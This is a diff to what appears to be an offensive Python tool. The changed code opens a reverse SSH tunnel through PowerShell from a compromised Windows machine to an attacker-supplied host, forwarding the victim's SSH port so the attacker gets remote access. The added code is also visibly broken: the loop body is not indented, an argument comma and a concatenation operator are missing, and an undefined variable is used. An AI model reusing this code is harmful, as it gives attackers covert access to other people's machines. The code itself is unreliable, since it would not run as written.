@@ -129,14 +129,22 @@ while True:
 
 #Action 3 = local SSH connection
     if action == "3":
-        #stating the PS comand to persistent SSH tunnel
-        sshuser=input("Enter attacker SSH username: ")
-        userip=input("Enter attacker IP (without port): ")
+        print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell before this action!!!")
+        attackerscriptcontinue=input("Continue? y/n: ")
+        while True:
+        if attackerscriptcontinue == "n":
+            print("Will not continue...")
+        elif attackerscriptcontinue == "y":
+            #stating the PS comand to persistent SSH tunnel
+            attackeruser=input("Enter attacker SSH username: ")
+            attackerip=input("Enter attacker IP (without port): ")
         
-        ssh_tunnel="ssh -R 8080:localhost:4444 "+sshuser+"@"+userip
-        subprocess.run(["powershell", "-Command", ssh_tunnel] check=True)
-        cls()
-        print(Fore.YELLOW + "Attempting to connect to attacker on " + sshuser)
-        sleep(1)
+            ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser"@"+attackerip
+            subprocess.run(["powershell", "-Command", ssh_tunnel] check=True)
+            cls()
+            print(Fore.YELLOW + "Attempting to connect to attacker on " + sshuser)
+            sleep(1)
+        else:
+            print(" ")
     else:
         print("")
